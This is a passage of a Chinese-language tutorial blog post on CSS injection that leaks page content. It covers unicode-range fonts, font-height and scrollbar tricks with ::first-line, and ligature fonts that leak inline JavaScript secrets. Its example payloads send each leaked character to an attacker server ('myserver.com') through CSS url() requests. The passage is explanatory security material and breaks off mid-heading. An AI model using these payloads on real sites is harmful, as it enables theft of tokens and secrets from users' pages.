punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_substr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            start_i <span class="token operator">=</span> new_substr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nonce<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> start_i<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment"># print("found: " + start_i)</span>                found <span class="token operator">+=</span> <span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># start over from latest backup</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>backup<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                nonce <span class="token operator">=</span> backup<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                found <span class="token operator">=</span> backup<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>                new_substr <span class="token operator">=</span> backup<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>                backup <span class="token operator">=</span> backup<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"no backup - aborting"</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"found more than one: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>found<span class="token punctuation">)</span><span class="token punctuation">)</span>                backup <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>nonce<span class="token punctuation">,</span> found<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> new_substr<span class="token punctuation">]</span><span class="token punctuation">]</span>            remove_i <span class="token operator">=</span> found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            nonce <span class="token operator">+=</span> new_substr<span class="token punctuation">[</span>remove_i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token comment"># input("nonce: " + nonce)</span>    <span class="token keyword">return</span> nonce</code></pre><h2 id="9-页面内容泄露"><a href="#9-页面内容泄露" class="headerlink" title="9. 页面内容泄露"></a>9. 页面内容泄露</h2><p>上述介绍的方法由于 CSS Selector 的限制，只能够获取到元素属性的值，<br>如果我们想要获取到页面上的其他文字或者脚本的内容，则需要使用其他的特殊方法</p><h3 id="9-1-unicode-range"><a href="#9-1-unicode-range" class="headerlink" title="9.1 unicode-range"></a>9.1 unicode-range</h3><blockquote><p>unicode-range 可以针对不同的字元，载入不同的字体</p></blockquote><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"Ampersand"</span><span class="token punctuation">;</span>        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token function">local</span><span class="token punctuation">(</span><span class="token string">"Times New Roman"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+26<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token selector">div</span> <span class="token punctuation">&#123;</span>        <span class="token property">font-size</span><span class="token punctuation">:</span> 4em<span class="token punctuation">;</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> Ampersand<span class="token punctuation">,</span> Helvetica<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Me &amp; You = Us<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p><code>&amp;</code> 的 unicode 是 U+0026，因此只有 <code>&amp;</code> 这个字会用不同的字体来显示，剩余部分都用同一个字体<br>因此我们可以利用它来泄露页面中的内容：</p><pre class="language-css" data-language="css"><code class="language-css">&lt;!DOCTYPE html>&lt;html>  &lt;body>    &lt;style>      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"f1"</span><span class="token punctuation">;</span>        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=1<span class="token punctuation">)</span></span><span class="token punctuation">;</span>        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+31<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"f2"</span><span class="token punctuation">;</span>        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=2<span class="token punctuation">)</span></span><span class="token punctuation">;</span>        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+32<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"f3"</span><span class="token punctuation">;</span>        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=3<span class="token punctuation">)</span></span><span class="token punctuation">;</span>        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+33<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fa"</span><span class="token punctuation">;</span>        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span>        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+61<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fb"</span><span class="token punctuation">;</span>        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=b<span class="token punctuation">)</span></span><span class="token punctuation">;</span>        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+62<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fc"</span><span class="token punctuation">;</span>        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=c<span class="token punctuation">)</span></span><span class="token punctuation">;</span>        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+63<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token selector">div</span> <span class="token punctuation">&#123;</span>        <span class="token property">font-size</span><span class="token punctuation">:</span> 4em<span class="token punctuation">;</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> f1<span class="token punctuation">,</span> f2<span class="token punctuation">,</span> f3<span class="token punctuation">,</span> fa<span class="token punctuation">,</span> fb<span class="token punctuation">,</span> fc<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    &lt;/style>    <span class="token property">Secret</span><span class="token punctuation">:</span> &lt;div>ca31a&lt;/div>  &lt;/body>&lt;/html></code></pre><p>但这种方法也具有局限性：</p><ol><li>无法得知字元的顺序</li><li>无法获知字元的重复与否</li></ol><h3 id="9-2-字体高度差异-first-line-scrollbar"><a href="#9-2-字体高度差异-first-line-scrollbar" class="headerlink" title="9.2 字体高度差异 + first-line + scrollbar"></a>9.2 字体高度差异 + first-line + scrollbar</h3><p>我们其实可以不载入外部字体，用内建的字体就能泄露出字元。<br>我们首先要找出两组高度不同的内建字体，<br>例如 <code>Comic Sans MS</code> 字体，已知它的高度比 <code>Courier New</code> 高，<br>假设预设的字体高度是 30px ，而 Comic Sans MS 是 45px ，那现在我们把文字区块的高度设成 40px ，并且载入字体：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fa"</span><span class="token punctuation">;</span>        <span class="token property">src</span><span class="token punctuation">:</span><span class="token function">local</span><span class="token punctuation">(</span><span class="token string">'Comic Sans MS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">font-style</span><span class="token punctuation">:</span>monospace<span class="token punctuation">;</span>        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+41<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token selector">div</span> <span class="token punctuation">&#123;</span>        <span class="token property">font-size</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>        <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> fa<span class="token punctuation">,</span> <span class="token string">"Courier New"</span><span class="token punctuation">;</span>        <span class="token property">letter-spacing</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>        <span class="token property">word-break</span><span class="token punctuation">:</span> break-all<span class="token punctuation">;</span>        <span class="token property">overflow-y</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>        <span class="token property">overflow-x</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>          </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>    Secret: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>DBC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>ABC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p><img src="image-6.png" alt="image-6.png"></p><p>在图中，很明显 <code>A</code> 比其他字元的高度都高，<br>而且根据我们的 CSS 设定，如果内容高度超过容器高度，会出现 scrollbar 。<br>虽然图中看不出来，但是下面的 ABC 存在 scrollbar，而上面的 DBC 却没有。</p><p>如果此时我们给 scrollbar 设置一个 style：</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">div::-webkit-scrollbar</span> <span class="token punctuation">&#123;</span>    <span class="token property">background</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">div::-webkit-scrollbar:vertical</span> <span class="token punctuation">&#123;</span>    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>则如果有 scrollbar 出现，我们的 server 就会收到请求，<br>如果 scrollbar 没有出现，我们就不会收到请求。</p><p>所以当我们把 div 套用 fa 字体时，</p><ul><li>如果画面上有 <code>A</code> ，就会出现 scrollbar ，我们的 server 就会收到请求。</li><li>如果画面上没有 <code>A</code> ，就什么事情都不会发生。</li></ul><p>因此，我如果一直重复载入不同字体，那我在 server 就能知道画面上有什么字元，这点跟刚刚我们使用 unicode-range 做到的事情是一样的。</p><h4 id="9-2-1-字元顺序问题"><a href="#9-2-1-字元顺序问题" class="headerlink" title="9.2.1 字元顺序问题"></a>9.2.1 字元顺序问题</h4><p>我们先把 div 的宽度缩减到只能显示一个字元，<br>这样其他字元就会被放到第二行去，<br>再使用 <code>::first-line</code> 的 selector ，就可以特别针对第一行来设置样式：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fa"</span><span class="token punctuation">;</span>        <span class="token property">src</span><span class="token punctuation">:</span><span class="token function">local</span><span class="token punctuation">(</span><span class="token string">'Comic Sans MS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">font-style</span><span class="token punctuation">:</span>monospace<span class="token punctuation">;</span>        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+41<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token selector">div</span> <span class="token punctuation">&#123;</span>        <span class="token property">font-size</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>        <span class="token property">width</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>        <span class="token property">font-family</span><span class="token punctuation">:</span> fa<span class="token punctuation">,</span> <span class="token string">"Courier New"</span><span class="token punctuation">;</span>        <span class="token property">letter-spacing</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>        <span class="token property">word-break</span><span class="token punctuation">:</span> break-all<span class="token punctuation">;</span>        <span class="token property">overflow-y</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>        <span class="token property">overflow-x</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token selector">div::first-line</span><span class="token punctuation">&#123;</span>        <span class="token property">font-size</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>    Secret: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>CBAD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>画面上就只会存在一个 <code>C</code> 的字元，<br>因为我们先用<code>font-size: 0px</code> 把所有字元的尺寸都设为 0，<br>再用 <code>div::first-line</code> 去做调整，<br>让第一行的 <code>font-size</code> 变成 30px。<br>换句话说，只有第一行的字元能看到，而现在的 div 宽度只有 20px，所以只会出现第一个字元。</p><p>接着，我们再运用刚刚学会的那招，去载入不同的字体。<br>当我载入 fa 这个字体时，因为画面上没有出现 <code>A</code> ，所以不会有任何变化。<br>但是当我载入 fc 这个字体时，画面上有 <code>C</code> ，<br>所以就会用 <code>Comic Sans MS</code> 来显示 <code>C</code> ，高度就会变高，scrollbar 就会出现，<br>就可以利用它来发出请求，代码如下：</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>  <span class="token property">font-size</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>  <span class="token property">width</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>  <span class="token property">font-family</span><span class="token punctuation">:</span> fc<span class="token punctuation">,</span> <span class="token string">"Courier New"</span><span class="token punctuation">;</span>  <span class="token property">letter-spacing</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>  <span class="token property">word-break</span><span class="token punctuation">:</span> break-all<span class="token punctuation">;</span>  <span class="token property">overflow-y</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>  <span class="token property">overflow-x</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>  <span class="token property">--leak</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://myserver.com?C<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">div::first-line</span><span class="token punctuation">&#123;</span>  <span class="token property">font-size</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">div::-webkit-scrollbar</span> <span class="token punctuation">&#123;</span>  <span class="token property">background</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">div::-webkit-scrollbar:vertical</span> <span class="token punctuation">&#123;</span>  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--leak<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>那我们要怎么样不断使用新的 font-family 呢？用 CSS animation 就可以做到，<br>我们可以使用 CSS animation 不断载入不同的 font-family 以及指定不同的 –-leak。</p><p>如此一来，我们就能知道画面上的第一个字元到底是什么。</p><h4 id="9-2-2-步骤"><a href="#9-2-2-步骤" class="headerlink" title="9.2.2 步骤"></a>9.2.2 步骤</h4><p>知道了第一个字元以后，我们把 div 的宽度变长，例如说变成 40px ，就能容纳两个字元，<br>因此第一行就会是前两个字，接着再用一样的方式载入不同的font-family，就能 leak 出第二个字元，详细流程如下：</p><ol><li>假设画面上是ACB</li><li>调整宽度为20px，第一行只出现第一个字元 A</li><li>载入字体fa，因此 A 用较高的字体显示，出现 scrollbar，载入 scrollbar 背景，传送请求给server</li><li>载入字体fb，但是 B 没有出现在画面上，因此没有任何变化。</li><li>载入字体fc，但是 C 没有出现在画面上，因此没有任何变化。</li><li>调整宽度为40px，第一行出现两个字元 AC</li><li>载入字体fa，因此 A 用较高的字体显示，出现 scrollbar，此时因为这个背景已经载入，所以不会发送新的请求</li><li>载入字体fb，但是 B 没有出现在画面上，因此没有任何变化</li><li>载入字体fc，因此 C 用较高的字体显示，出现 scrollbar，并且载入背景</li><li>调整宽度为60px，ACB 三个字元都出现在第一行</li><li>载入字体fa，同第七步</li><li>载入字体fb，B 用较高的字体显示，出现 scrollbar 并且载入背景</li><li>载入字体fc，C 用较高的字体显示，但因为已经载入过相同背景，不会发送请求</li><li>结束</li></ol><p>从上面流程中可以看出 server 会依序收到A, C, B 三个reqeust，代表了画面上字元的顺序。<br>而不断改变宽度以及 font-family 都可以用 CSS animation 做到</p><h4 id="9-2-3-局限性"><a href="#9-2-3-局限性" class="headerlink" title="9.2.3 局限性"></a>9.2.3 局限性</h4><p>这个解法虽然解决了不知道字元顺序的问题，但依然无法解决重复字元的问题，<br>因为重复的字元不会再发出请求。</p><h3 id="9-3-连字-scrollbar"><a href="#9-3-连字-scrollbar" class="headerlink" title="9.3 连字 + scrollbar"></a>9.3 连字 + scrollbar</h3><h4 id="9-3-1-连字"><a href="#9-3-1-连字" class="headerlink" title="9.3.1 连字"></a>9.3.1 连字</h4><p>在某些字型当中，会把一些特定的组合 render 成连在一起的样子，如下图：</p><p><img src="image-7.png" alt="image-7.png"></p><h4 id="9-3-2-实现方法"><a href="#9-3-2-实现方法" class="headerlink" title="9.3.2 实现方法"></a>9.3.2 实现方法</h4><p>我们可以自己制作出一个独特的字体，把 <code>ab</code> 设定成连字，并且 render 出一个超宽的元素。<br>接着，我们把某个 div 宽度设成固定，然后结合 scrollbar：</p><ul><li>如果 ab 出现了，就会变很宽，scrollbar 就会出现，就可以载入请求来告诉 server；</li><li>如果 ab 没有出现，那 scrollbar 就不会出现，就不会有事情发生。</li></ul><h4 id="9-3-3-步骤"><a href="#9-3-3-步骤" class="headerlink" title="9.3.3 步骤"></a>9.3.3 步骤</h4><ol><li>载入有连字 aa 的字体，没有发生变化</li><li>载入有连字 ab 的字体，没有发生变化</li><li>载入有连字 ac 的字体，成功渲染宽画面，scrollbar 出现，载入 server 图片</li><li>server 知道画面上有 ac</li><li>载入有连字 aca 的字体，没有发生变化</li><li>载入有连字 acb 的字体，没有发生变化</li><li>载入有连字 acc 的字体，成功渲染宽画面，scrollbar 出现，传送结果给 server</li><li>server 知道画面上有 acc</li></ol><h4 id="9-3-4-泄露-JavaScript-代码"><a href="#9-3-4-泄露-JavaScript-代码" class="headerlink" title="9.3.4 泄露 JavaScript 代码"></a>9.3.4 泄露 JavaScript 代码</h4><p>通过利用连字和 scrollbar ，我们可以一个字元一个字元慢慢地泄露出页面上的内容，甚至JavaScript的代码：</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">head, script</span> <span class="token punctuation">&#123;</span>  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>使用上述 CSS 可以让 script 内容也显示在画面上，<br>因此我们也可以利用同样的技巧，泄露 script 的内容：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> secret <span class="token operator">=</span> <span class="token string">"abc123"</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> secret2 <span class="token operator">=</span> <span class="token string">"cba321"</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>defs</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">horiz-adv-x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font-face</span> <span class="token attr-name">font-family</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hack<span class="token punctuation">"</span></span> <span class="token attr-name">units-per-em</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>glyph</span> <span class="token attr-name">unicode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">"</span>a<span class="token punctuation">'</span></span> <span class="token attr-name">horiz-adv-x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>99999<span class="token punctuation">"</span></span> <span class="token attr-name">d</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>M1 0z<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>defs</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">    <span class="token selector">script</span> <span class="token punctuation">&#123;</span>      <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>      <span class="token property">font-family</span><span class="token punctuation">:</span><span class="token string">"hack"</span><span class="token punctuation">;</span>      <span class="token property">white-space</span><span class="token punctuation">:</span>n owrap<span class="token punctuation">;</span>      <span class="token property">overflow-x</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>      <span class="token property">width</span><span class="token punctuation">:</span> 500px<span class="token punctuation">;</span>      <span class="token property">background</span><span class="token punctuation">:</span>lightblue<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token selector">script::-webkit-scrollbar</span> <span class="token punctuation">&#123;</span>      <span class="token property">background</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>以上示例中包含两段 js 代码：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> secret <span class="token operator">=</span> <span class="token string">"abc123"</span><span class="token keyword">var</span> secret2 <span class="token operator">=</span> <span class="token string">"cba321"</span></code></pre><p>由于样式表中的设置，只要存在 “a 连字，就会渲染一个超宽的宽度，<br>就会导致 scrollbar 的出现，背景就会变为蓝色，效果如下：</p><p><img src="image-.png" alt="image-8.png"></p><p>上面的部分是因为内容为 <code>var secret = &quot;abc123&quot;</code> ，包含了 “a 的连字，<br>因此宽度变为超宽，scrollbar 出现，背景变为蓝色。</p><p>下面的部分是因为没有 “a 的连字，所以 scrollbar 没出现。<br>（有 a 的地方都会缺字，应该与没有定义其他的 glyph 有关，但不影响结果）</p><p>因此只要把 scrollbar 的背景换成 URL，就可以从 server 端获得泄露的信息。</p><h4 id="9-3-5-字体的产生"><a href="#9-3-5-字体的产生" class="headerlink" title="9.3.5 字体的产生"></a>9.3.5 